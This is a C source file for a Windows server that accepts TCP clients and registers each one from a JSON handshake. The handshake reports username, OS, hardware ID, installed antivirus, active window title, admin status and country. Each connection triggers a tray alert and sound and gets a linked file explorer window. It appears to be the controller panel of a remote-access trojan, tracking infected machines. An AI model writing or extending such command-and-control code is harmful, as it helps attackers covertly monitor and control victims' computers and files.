#include <globals.h>
#include <ws2tcpip.h>
#include <server/server_logic.h>
#include <server/server_errors.h>
#include <service/notification.h>
#include <service/soundplayer.h>
#include <stdio.h>
#include <gui/log_page.h>
#include <commctrl.h>
#include <helpers/utils.h>
#include <cJSON/cJSON.h>
#include <service/network_service.h>
#include <gui/file_explorer/fe_main_window.h>
#include <gui/file_explorer/fe_custom_messages.h>
#include <resource.h>

DWORD WINAPI StartListenerThread(LPVOID lpParameter)
{
    ServerInfo *pServer = (ServerInfo *)lpParameter;
    int serverIndex = pServer - g_servers;
    BOOL bSuccess = FALSE;
    char *ipAddressA = NULL;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        PostLogMessage(L"WSAStartup Failed: %d", WSAGetLastError());
        goto cleanup;
    }

    pServer->listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (pServer->listenSocket == INVALID_SOCKET)
    {
        PostLogMessage(L"Socket Creation Failed for %s:%d. Error: %d", pServer->ipAddress, pServer->port, WSAGetLastError());
        goto cleanup;
    }

    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    ipAddressA = ConvertWCHARToCHAR(pServer->ipAddress);
    if (!ipAddressA)
    {
        PostLogMessage(L"Failed to convert IP address to ASCII.");
        goto cleanup;
    }
    server_address.sin_addr.s_addr = inet_addr(ipAddressA);
    server_address.sin_port = htons((u_short)pServer->port);
    free(ipAddressA);
    ipAddressA = NULL;

    if (bind(pServer->listenSocket, (struct sockaddr *)&server_address, sizeof(server_address)) == SOCKET_ERROR)
    {
        PostLogMessage(L"Socket Bind Failed for %s:%d. Error: %d", pServer->ipAddress, pServer->port, WSAGetLastError());
        goto cleanup;
    }

    if (listen(pServer->listenSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        PostLogMessage(L"Socket Listen Failed for %s:%d. Error: %d", pServer->ipAddress, pServer->port, WSAGetLastError());
        goto cleanup;
    }

    bSuccess = TRUE;
    pServer->status = SERVER_LISTENING;
    PostMessage(g_hWnd, WM_APP_UPDATE_STATUS, (WPARAM)serverIndex, (LPARAM)pServer->status);
    PostLogMessage(L"Server listening on %s:%d", pServer->ipAddress, pServer->port);

    while (pServer->status == SERVER_LISTENING)
    {
        struct sockaddr_in client_address;
        int client_addr_len = sizeof(client_address);
        SOCKET clientSocket = accept(pServer->listenSocket, (struct sockaddr *)&client_address, &client_addr_len);

        if (clientSocket == INVALID_SOCKET)
        {
            EnterCriticalSection(&g_cs_servers);
            if (pServer->status == SERVER_LISTENING)
            {
                PostLogMessage(L"Accept failed on server %s:%d. Shutting down. Error: %d", pServer->ipAddress, pServer->port, WSAGetLastError());
                pServer->status = SERVER_ERROR;
                PostMessage(g_hWnd, WM_APP_UPDATE_STATUS, (WPARAM)serverIndex, (LPARAM)pServer->status);
            }
            LeaveCriticalSection(&g_cs_servers);
            break;
        }

        char *clientIp = inet_ntoa(client_address.sin_addr);

        ShowTrayNotification(g_hWnd, L"Client Connected", L"A new client has connected successfully.");
        HANDLE hconThread = CreateThread(NULL, 0, PlaySoundThread, (LPVOID)(uintptr_t)IDR_WAVE_CONNECTED, 0, NULL);
        if (hconThread)
            CloseHandle(hconThread);

        ClientThreadArgs *args = (ClientThreadArgs *)malloc(sizeof(ClientThreadArgs));
        if (args)
        {
            args->clientSocket = clientSocket;
#ifndef __TINYC__
            strncpy_s(args->clientIp, sizeof(args->clientIp), clientIp, _TRUNCATE);
#else
            snprintf(args->clientIp, sizeof(args->clientIp), "%s", clientIp);
#endif

            HANDLE hClientThread = CreateThread(NULL, 0, ClientHandlerThread, args, 0, NULL);
            if (hClientThread)
            {
                CloseHandle(hClientThread);
            }
            else
            {
                PostLogMessage(L"Failed to create handler thread for client %hs.", clientIp);
                free(args);
                closesocket(clientSocket);
            }
        }
        else
        {
            PostLogMessage(L"Failed to allocate memory for client thread arguments.");
            closesocket(clientSocket);
        }
    }

cleanup:
    if (pServer->listenSocket != INVALID_SOCKET)
    {
        closesocket(pServer->listenSocket);
        pServer->listenSocket = INVALID_SOCKET;
    }
    if (!bSuccess)
        pServer->status = SERVER_ERROR;
    return 0;
}

static const char *GetJsonString(cJSON *obj, const char *key)
{

    cJSON *item = cJSON_GetObjectItemCaseSensitive(obj, key);
    return (cJSON_IsString(item) && item->valuestring) ? item->valuestring : "N/A";
}

DWORD WINAPI ClientHandlerThread(LPVOID lpParameter)
{
    ClientThreadArgs *args = (ClientThreadArgs *)lpParameter;
    SOCKET clientSocket = args->clientSocket;
    char clientIp[16];

#ifndef __TINYC__
    strcpy_s(clientIp, sizeof(clientIp), args->clientIp);
#else
    snprintf(clientIp, sizeof(clientIp), "%s", args->clientIp);
#endif

    free(args);

    int clientIndex = -1;

    PacketType packet_type;
    cJSON *json_response = NULL;
    char *binary_data = NULL;
    uint32_t binary_size = 0;

    if (ReceiveRequest(clientSocket, &packet_type, &json_response, &binary_data, &binary_size, NULL, NULL) && packet_type == PACKET_TYPE_JSON)
    {

        EnterCriticalSection(&g_cs_clients);
        int freeSlotIndex = -1;
        if (g_active_client_count < MAX_CLIENTS)
        {
            for (int i = 0; i < MAX_CLIENTS; i++)
            {
                if (!g_active_clients[i].isActive)
                {
                    freeSlotIndex = i;
                    break;
                }
            }
        }

        if (freeSlotIndex != -1)
        {

            g_active_clients[freeSlotIndex].socket = clientSocket;
            g_active_clients[freeSlotIndex].hThread = GetCurrentThread();
            g_active_clients[freeSlotIndex].hExplorerWnd = NULL;
            g_active_clients[freeSlotIndex].isActive = TRUE;

#ifndef __TINYC__
            strncpy_s(g_active_clients[freeSlotIndex].info.ipAddress, sizeof(g_active_clients[freeSlotIndex].info.ipAddress), clientIp, _TRUNCATE);
#else
            snprintf(g_active_clients[freeSlotIndex].info.ipAddress, sizeof(g_active_clients[freeSlotIndex].info.ipAddress), "%s", clientIp);
#endif
            SYSTEMTIME st;
            GetLocalTime(&st);
            sprintf_s(g_active_clients[freeSlotIndex].info.date, sizeof(g_active_clients[freeSlotIndex].info.date), "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
#ifndef __TINYC__
            strncpy_s(g_active_clients[freeSlotIndex].info.username, sizeof(g_active_clients[freeSlotIndex].info.username), GetJsonString(json_response, "username"), _TRUNCATE);
            strncpy_s(g_active_clients[freeSlotIndex].info.os, sizeof(g_active_clients[freeSlotIndex].info.os), GetJsonString(json_response, "os"), _TRUNCATE);
            strncpy_s(g_active_clients[freeSlotIndex].info.group, sizeof(g_active_clients[freeSlotIndex].info.group), GetJsonString(json_response, "group"), _TRUNCATE);
            strncpy_s(g_active_clients[freeSlotIndex].info.gpu, sizeof(g_active_clients[freeSlotIndex].info.gpu), GetJsonString(json_response, "gpu"), _TRUNCATE);
            strncpy_s(g_active_clients[freeSlotIndex].info.cpu, sizeof(g_active_clients[freeSlotIndex].info.cpu), GetJsonString(json_response, "cpu"), _TRUNCATE);
            strncpy_s(g_active_clients[freeSlotIndex].info.clientID, sizeof(g_active_clients[freeSlotIndex].info.clientID), GetJsonString(json_response, "hardware_id"), _TRUNCATE);
            strncpy_s(g_active_clients[freeSlotIndex].info.antivirus, sizeof(g_active_clients[freeSlotIndex].info.antivirus), GetJsonString(json_response, "antivirus"), _TRUNCATE);
            strncpy_s(g_active_clients[freeSlotIndex].info.active_window, sizeof(g_active_clients[freeSlotIndex].info.active_window), GetJsonString(json_response, "active_window"), _TRUNCATE);
            strncpy_s(g_active_clients[freeSlotIndex].info.country, sizeof(g_active_clients[freeSlotIndex].info.country), GetJsonString(json_response, "country"), _TRUNCATE);
#else
            snprintf(g_active_clients[freeSlotIndex].info.username, sizeof(g_active_clients[freeSlotIndex].info.username), "%s", GetJsonString(json_response, "username"));
            snprintf(g_active_clients[freeSlotIndex].info.os, sizeof(g_active_clients[freeSlotIndex].info.os), "%s", GetJsonString(json_response, "os"));
            snprintf(g_active_clients[freeSlotIndex].info.group, sizeof(g_active_clients[freeSlotIndex].info.group), "%s", GetJsonString(json_response, "group"));
            snprintf(g_active_clients[freeSlotIndex].info.gpu, sizeof(g_active_clients[freeSlotIndex].info.gpu), "%s", GetJsonString(json_response, "gpu"));
            snprintf(g_active_clients[freeSlotIndex].info.cpu, sizeof(g_active_clients[freeSlotIndex].info.cpu), "%s", GetJsonString(json_response, "cpu"));
            snprintf(g_active_clients[freeSlotIndex].info.clientID, sizeof(g_active_clients[freeSlotIndex].info.clientID), "%s", GetJsonString(json_response, "hardware_id"));
            snprintf(g_active_clients[freeSlotIndex].info.antivirus, sizeof(g_active_clients[freeSlotIndex].info.antivirus), "%s", GetJsonString(json_response, "antivirus"));
            snprintf(g_active_clients[freeSlotIndex].info.active_window, sizeof(g_active_clients[freeSlotIndex].info.active_window), "%s", GetJsonString(json_response, "active_window"));
            snprintf(g_active_clients[freeSlotIndex].info.country, sizeof(g_active_clients[freeSlotIndex].info.country), "%s", GetJsonString(json_response, "country"));
#endif

            cJSON *isAdminJson = cJSON_GetObjectItemCaseSensitive(json_response, "is_admin");
            g_active_clients[freeSlotIndex].info.UAC = cJSON_IsTrue(isAdminJson);
            cJSON *ramJson = cJSON_GetObjectItemCaseSensitive(json_response, "total_ram_mb");
            if (cJSON_IsNumber(ramJson))
            {
                sprintf_s(g_active_clients[freeSlotIndex].info.ram, sizeof(g_active_clients[freeSlotIndex].info.ram), "%d MB", ramJson->valueint);
            }
            else
            {
#ifndef __TINYC__
                strcpy_s(g_active_clients[freeSlotIndex].info.ram, sizeof(g_active_clients[freeSlotIndex].info.ram), "N/A");
#else
                snprintf(g_active_clients[freeSlotIndex].info.ram, sizeof(g_active_clients[freeSlotIndex].info.ram), "%s", "N/A");
#endif
            }

            clientIndex = freeSlotIndex;
            g_active_client_count++;
        }
        LeaveCriticalSection(&g_cs_clients);

        if (clientIndex != -1)
        {
            ClientInfo *newClientForGui = (ClientInfo *)malloc(sizeof(ClientInfo));
            if (newClientForGui)
            {
                *newClientForGui = g_active_clients[clientIndex].info;

                PostMessageW(g_hWnd, WM_APP_ADD_CLIENT, (WPARAM)clientIndex, (LPARAM)newClientForGui);
            }
            else
            {
                PostLogMessage(L"Failed to allocate memory for GUI client info.");
            }
        }
        else
        {
            PostLogMessage(L"Server full. Client %hs denied connection.", clientIp);
            closesocket(clientSocket);
            cJSON_Delete(json_response);
            if (binary_data)
                free(binary_data);
            return 1;
        }
        cJSON_Delete(json_response);
        if (binary_data)
            free(binary_data);
    }
    else
    {
        PostLogMessage(L"Client %hs failed initial handshake. Disconnecting.", clientIp);
        closesocket(clientSocket);
        return 1;
    }

    if (clientIndex == -1)
    {
        PostLogMessage(L"Client %hs was not added (server full or handshake failed). Disconnecting.", clientIp);

        closesocket(clientSocket);
        return 1;
    }

    char dummy_buf[1];
    while (g_bIsRunning)
    {

        int result = recv(clientSocket, dummy_buf, sizeof(dummy_buf), MSG_PEEK);
        if (result == 0)
        {
            PostLogMessage(L"Client %hs disconnected gracefully.", clientIp);
            break;
        }
        else if (result == SOCKET_ERROR)
        {
            PostLogMessage(L"Client %hs disconnected (error: %d).", clientIp, WSAGetLastError());
            break;
        }
        Sleep(250);
    }

    ShowTrayNotification(g_hWnd, L"Client Disconnected", L"A client has disconnected.");
    HANDLE hdisconThread = CreateThread(NULL, 0, PlaySoundThread, (LPVOID)(uintptr_t)IDR_WAVE_DISCONNECTED, 0, NULL);
    if (hdisconThread)
        CloseHandle(hdisconThread);

    closesocket(clientSocket);

    EnterCriticalSection(&g_cs_clients);
    int foundIndex = -1;
    for (int i = 0; i < MAX_CLIENTS; i++)
    {
        if (g_active_clients[i].isActive && g_active_clients[i].socket == clientSocket)
        {
            foundIndex = i;
            break;
        }
    }

    if (foundIndex != -1)
    {

        HWND hExplorer = g_active_clients[foundIndex].hExplorerWnd;
        if (hExplorer && IsWindow(hExplorer))
        {

            PostMessage(hExplorer, WM_APP_FE_CLIENT_DISCONNECTED, 0, 0);
        }

        g_active_clients[foundIndex].socket = INVALID_SOCKET;
        g_active_clients[foundIndex].hThread = NULL;
        g_active_clients[foundIndex].hExplorerWnd = NULL;
        g_active_clients[foundIndex].isActive = FALSE;

        g_active_client_count--;

        PostMessage(g_hWnd, WM_APP_REMOVE_CLIENT, (WPARAM)foundIndex, 0);
    }
    LeaveCriticalSection(&g_cs_clients);

    return 0;
}